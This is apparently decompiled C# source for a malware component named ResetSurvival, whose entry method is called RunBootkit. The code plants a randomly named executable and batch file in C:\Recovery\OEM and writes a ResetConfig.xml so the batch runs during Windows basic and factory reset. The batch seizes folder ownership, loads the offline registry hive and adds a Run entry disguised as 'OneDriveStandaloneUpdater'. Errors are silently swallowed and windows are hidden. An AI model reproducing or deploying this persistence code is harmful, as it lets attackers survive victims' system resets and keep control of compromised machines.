using System;
using System.Diagnostics;
using System.IO;

namespace ResetSurvival.ResetSurvival
{
	// Token: 0x02000009 RID: 9
	public class ResetSurvival
	{
		// Token: 0x06000013 RID: 19 RVA: 0x00002230 File Offset: 0x00000430
		public static void RunBootkit(string sourceFilePath)
		{
			try
			{
				bool flag = !File.Exists(sourceFilePath);
				bool flag2 = flag;
				if (flag2)
				{
					throw new FileNotFoundException("Source file does not exist.", sourceFilePath);
				}
				string fileName = Guid.NewGuid().ToString() + ".exe";
				string batchName = Guid.NewGuid().ToString() + ".bat";
				string resetConfig = ResetSurvival.GenerateResetConfig(batchName);
				string persistenceBatch = ResetSurvival.GeneratePersistenceBatch(fileName, batchName);
				ResetSurvival.CreateResetEnvironment(ResetSurvival.targetDirectory, fileName, batchName, resetConfig, persistenceBatch, sourceFilePath);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000022E0 File Offset: 0x000004E0
		private static string GenerateResetConfig(string batchName)
		{
			return string.Concat(new string[]
			{
				"<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<Reset>\r\n  <Run Phase=\"BasicReset_AfterImageApply\">\r\n",
				string.Format("    <Path>{0}</Path>", batchName),
				"\r\n    <Duration>1</Duration>\r\n  </Run>\r\n  <Run Phase=\"FactoryReset_AfterImageApply\">\r\n",
				string.Format("    <Path>{0}</Path>", batchName),
				"\r\n    <Duration>1</Duration>\r\n  </Run>\r\n</Reset>\r\n"
			});
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002334 File Offset: 0x00000534
		private static string GeneratePersistenceBatch(string fileName, string batchName)
		{
			return string.Concat(new string[]
			{
				"@echo off\r\nsetlocal ENABLEEXTENSIONS\r\nset TARGET_PARENT=C:\\Recovery\r\nset TARGET_FOLDER=C:\\Recovery\\OEM\r\nset SOFTWARE_HIVE_PATH=C:\\Windows\\System32\\config\\SOFTWARE\r\ntakeown /f \"%TARGET_PARENT%\" /r /d y\r\nicacls \"%TARGET_PARENT%\" /grant *S-1-5-18:F /t /c\r\ntakeown /f \"%TARGET_FOLDER%\" /r /d y\r\nicacls \"%TARGET_FOLDER%\" /grant *S-1-5-18:F /t /c\r\nreg load HKLM\\TempHive \"%SOFTWARE_HIVE_PATH%\"\r\n",
				string.Format("reg add \"HKLM\\TempHive\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"OneDriveStandaloneUpdater\" /t REG_SZ /d \"\\\"%TARGET_FOLDER%\\{0}\\\"\" /f", fileName),
				"\r\nreg unload HKLM\\TempHive\r\n",
				string.Format("start \"\" \"%TARGET_FOLDER%\\{0}\"", fileName),
				"\r\nendlocal\r\nexit\r\n"
			});
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002388 File Offset: 0x00000588
		private static void CreateResetEnvironment(string targetDir, string fileName, string batchName, string resetConfig, string persistenceBatch, string sourceFilePath)
		{
			try
			{
				bool flag = !Directory.Exists(targetDir);
				bool flag2 = flag;
				if (flag2)
				{
					Directory.CreateDirectory(targetDir);
				}
				ResetSurvival.EnsureFolderOwnership(targetDir);
				ResetSurvival.SafeFileDelete(Path.Combine(targetDir, "ResetConfig.xml"));
				File.WriteAllText(Path.Combine(targetDir, "ResetConfig.xml"), resetConfig);
				ResetSurvival.SafeFileDelete(Path.Combine(targetDir, batchName));
				File.WriteAllText(Path.Combine(targetDir, batchName), persistenceBatch);
				ResetSurvival.SafeFileDelete(Path.Combine(targetDir, fileName));
				File.Copy(sourceFilePath, Path.Combine(targetDir, fileName));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x00002434 File Offset: 0x00000634
		private static void EnsureFolderOwnership(string folderPath)
		{
			try
			{
				string directoryName = Path.GetDirectoryName(folderPath);
				ResetSurvival.RunCommand("takeown", string.Format("/f \"{0}\" /r /d y", directoryName));
				ResetSurvival.RunCommand("icacls", string.Format("\"{0}\" /grant *S-1-5-18:F /t /c", directoryName));
				ResetSurvival.RunCommand("takeown", string.Format("/f \"{0}\" /r /d y", folderPath));
				ResetSurvival.RunCommand("icacls", string.Format("\"{0}\" /grant *S-1-5-18:F /t /c", folderPath));
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000024C4 File Offset: 0x000006C4
		private static void RunCommand(string fileName, string arguments)
		{
			using (Process process = new Process())
			{
				process.StartInfo.FileName = fileName;
				process.StartInfo.Arguments = arguments;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.UseShellExecute = false;
				process.Start();
				process.WaitForExit();
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x0000253C File Offset: 0x0000073C
		private static void SafeFileDelete(string filePath)
		{
			try
			{
				bool flag = File.Exists(filePath);
				bool flag2 = flag;
				if (flag2)
				{
					File.Delete(filePath);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x04000008 RID: 8
		private static string targetDirectory = "C:\\Recovery\\OEM";
	}
}
